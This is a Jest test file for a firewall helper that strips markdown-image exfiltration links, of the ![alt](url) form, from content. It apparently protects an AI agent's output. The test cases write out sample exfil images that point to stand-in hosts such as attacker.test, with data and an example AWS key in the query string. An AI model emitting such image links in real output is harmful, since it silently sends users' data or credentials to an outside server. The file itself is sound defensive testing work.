/**
 * Tests for neutraliseMarkdownImageExfil — the enforce-layer helper that strips
 * markdown-image exfiltration links by re-running the SAME detection regex +
 * predicate over the (possibly already-mutated) content and replacing the whole
 * ![alt](url) match. This fixes the ordering/truncation bypass: it does not rely
 * on substring equality with a pre-captured (truncated) URL.
 */

import { describe, it, expect } from '@jest/globals';
import { neutraliseMarkdownImageExfil } from '../firewall/markdown-image-detector.js';

describe('neutraliseMarkdownImageExfil', () => {
  it('neutralises an exfil image URL (full match replaced, surrounding text kept)', () => {
    const url = 'https://attacker.test/log?d=' + 'A'.repeat(40);
    const content = `before\n![pixel](${url})\nafter`;
    const { content: out, stripped } = neutraliseMarkdownImageExfil(content);

    expect(stripped).toBe(1);
    expect(out).not.toContain('attacker.test');
    expect(out).not.toMatch(/A{20,}/);
    expect(out).toContain('before');
    expect(out).toContain('after');
  });

  it('neutralises a URL longer than 200 chars with no surviving payload tail', () => {
    const url = 'https://attacker.test/log?d=' + 'B'.repeat(500);
    const content = `![x](${url})`;
    const { content: out, stripped } = neutraliseMarkdownImageExfil(content);

    expect(stripped).toBe(1);
    expect(out).not.toContain('attacker.test');
    expect(out).not.toMatch(/B{20,}/);
  });

  it('leaves benign images untouched', () => {
    const content = '![logo](https://example.com/logo.png) and some text';
    const { content: out, stripped } = neutraliseMarkdownImageExfil(content);

    expect(stripped).toBe(0);
    expect(out).toBe(content);
  });

  it('fully neutralises a credential-bearing exfil URL (no credential leak survives)', () => {
    const url = 'https://attacker.test/p?leak=AKIAIOSFODNN7EXAMPLE&more=' + 'C'.repeat(30);
    const content = `mem\n![p](${url})`;
    const { content: out, stripped } = neutraliseMarkdownImageExfil(content);

    expect(stripped).toBe(1);
    expect(out).not.toContain('AKIAIOSFODNN7EXAMPLE');
    expect(out).not.toContain('attacker.test');
  });

  it('neutralises multiple exfil images in one payload', () => {
    const u1 = 'https://a.test/x?d=' + 'A'.repeat(30);
    const u2 = 'https://b.test/y?d=' + 'B'.repeat(30);
    const content = `![1](${u1}) middle ![2](${u2})`;
    const { content: out, stripped } = neutraliseMarkdownImageExfil(content);

    expect(stripped).toBe(2);
    expect(out).not.toContain('a.test');
    expect(out).not.toContain('b.test');
    expect(out).toContain('middle');
  });
});
